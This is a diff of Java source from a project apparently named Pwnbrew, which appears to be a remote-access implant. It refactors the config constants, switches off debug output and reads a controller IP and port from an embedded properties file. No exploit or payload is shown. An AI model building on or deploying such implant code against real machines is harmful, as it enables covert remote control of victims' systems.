@@ -55,7 +55,6 @@ import java.nio.channels.FileLock;
 import java.nio.channels.OverlappingFileLockException;
 import java.util.HashMap;
 import java.util.Map;
-import java.util.Properties;
 import java.util.logging.Level;
 import pwnbrew.log.RemoteLog;
 import pwnbrew.log.LoggableException;
@@ -63,6 +62,7 @@ import pwnbrew.manager.CommManager;
 import pwnbrew.manager.DataManager;
 import pwnbrew.misc.Constants;
 import pwnbrew.misc.DebugPrinter;
+import pwnbrew.misc.ManifestProperties;
 import pwnbrew.misc.ReconnectTimer;
 import pwnbrew.misc.Utilities;
 import pwnbrew.network.control.ControlMessageManager;
@@ -84,19 +84,11 @@ import pwnbrew.task.TaskRunner;
 public final class Pwnbrew extends CommManager implements TaskListener {
 
     private static final String NAME_Class = Pwnbrew.class.getSimpleName();
-    private static final boolean debug = true;
+    private static final boolean debug = false;
   
     //The Server Details
     private final Map<Integer, TaskRunner> theTaskMap = new HashMap<Integer, TaskRunner>();
   
-    //FileLock variables
-    public static final String URL_LABEL ="U";
-    public static final String SERV_LABEL ="S";
-    public static final String SLEEP_LABEL ="Z";
-    public static final String PORT_LABEL ="P";
-    public static final String DATA_LABEL ="D";
-    public static final String PROP_FILE ="prpt";
-    public static final String STAG_PROP_FILE ="stg";
     private static final String lckFileName = "crt.log";
     private FileLock theLock = null;
     private FileChannel theLockFileChannel = null;
@@ -237,22 +229,22 @@ public final class Pwnbrew extends CommManager implements TaskListener {
             String[] inputArr = new String[0];
             if( args.length == 0 ){
                 
-                Properties localProperties = new Properties();
+                ManifestProperties localProperties = new ManifestProperties();
                 Class localClass = Pwnbrew.class;
-                InputStream localInputStream = localClass.getResourceAsStream("/" + PROP_FILE);
+                InputStream localInputStream = localClass.getResourceAsStream("/" + Constants.PROP_FILE);
                 if (localInputStream != null) {
                     localProperties.load(localInputStream);
                     localInputStream.close();
                 }
 
                 //Get ip
-                String ip = localProperties.getProperty(SERV_LABEL);
+                String ip = localProperties.getProperty(Constants.SERV_LABEL);
                 if( ip == null ){
                     return;
                 }
 
                 //Get control
-                String thePort = localProperties.getProperty(PORT_LABEL);
+                String thePort = localProperties.getProperty(Constants.PORT_LABEL);
                 if( thePort == null ){
                     return;
                 }
